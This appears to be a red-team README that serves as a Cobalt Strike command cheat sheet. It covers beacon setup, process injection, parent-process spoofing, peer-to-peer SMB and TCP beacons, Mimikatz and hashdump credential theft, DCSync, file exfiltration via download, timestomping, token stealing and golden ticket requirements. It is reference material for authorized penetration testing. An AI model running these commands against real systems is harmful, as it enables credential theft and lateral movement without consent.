<p align="center">
  <img width="500" height="100" src="https://github.com/bigb0sss/RedTeam/blob/master/CobaltStrike/cs_logo.png">
</p>

## Command References

### Beacons
#### Sleep
```
sleep 60 50               ; Sleep 60 sec with 50% of jitter (Call back between 30 to 60 secs randomly) 
```

#### Command Execution
##### Default
```
run [command]
```
##### powershell.exe
```
powershell-import [/path/to/your.ps1]       ; Running it from your localhost
powershell [cmdlet] [args]
```
##### powerpick (Using PS w/o powershell.exe)
```
powrepick [cmdlet] [args]
```

##### psinject (Using PS within another process)
```
psinject [PID] [x86|x64] [cmdlet] [args]
```

##### .NET
```
execute-assembly [/path/to/your.exe]        ; Running it from your localhost
```

##### cmd.exe
```
shell [command] [args]
```

#### Session Passing
```css
spawn [x86|x64] [Listener]
inject [PID] [x86|x64] [Listener]
```

#### Parent Process Modification
```
ppid [Choice of your parent process (e.g., iexplore.exe)]
spawnto [x86|x64] [New parent process]
```

#### SMB Beacn
```
spawn [SMB-Listner-Name]                    ; Spawning a peer-to-peer ("P2P") SMB beacon 
inject [PID] [x86|x64] [SMB-Listner-Name]   ; Useful when trying to spawn P2P beacon as different user context
```

#### TCP Beacn
```
spawn [TCP-Listner-Name]                    ; Spawning a peer-to-peer ("P2P") TCP beacon 
                                            ; TCP beacons can be also run locally by clicking "Bind to localhost only" on GUI
inject [PID] [x86|x64] [TCP-Listner-Name]   ; Useful when trying to spawn P2P beacon as different user context
```
#### Credentials and Hashes
```
logonpasswords                              ; Run Mimikatz
hashdump                                    ; Get SAM database hashes
```

#### Mimikatz
```
mimikatz [command] [args]                   ; Runs a Mimikatz command
mimikatz ![command] [args]                  ; Elevate to SYSTEM and run Mimikatz command
mimikatz @[command] [args]                  ; User current token to run Mimikatz command
```
#### DCSync
```
dcsync [domain] [DOMAIN\user]
```

#### File Download
```
download [file]
cancel [file|*]
downloads
View --> Downloads --> Sync Files
```

#### File Upload
```
upload [/path/to/file]
timestomp [Destination] [Source]            ; Changing file's timestamps (*Do not recommend using it during the engagement) 
```

#### Token Stealing
```
ps                                          ; List process
steal_token [PID]                           ; Stealing token
getuid                                      ; Identify/confirm who you are
rev2self                                    ; Drop/revoke token

spawnas DOMAIN\user password                ; Spawn a beacon w/ alternative creds
make_token DOMaIN\user password             ; Create a token. So when you do a make_token, when you do 'whoami' you will 
                                            ; still see your current user account; however, if you do a remote 'whoami' 
                                            ; (maybe against DC) you will see that the maked token user.
```

#### Kerberos Tickets
```
klist                                       ; See your current Kerberos tray 
kerberos_ticket_purge                       ; Purge tickets
kerberos_ticket_user [/path/to/file.ticket] ; Load a ticket

<Golden Ticket>
- Desired user and DOMAIN name
- Domain SID [whoami /user + drop last number]
- NTLM hash of krbtgt user from DC
```
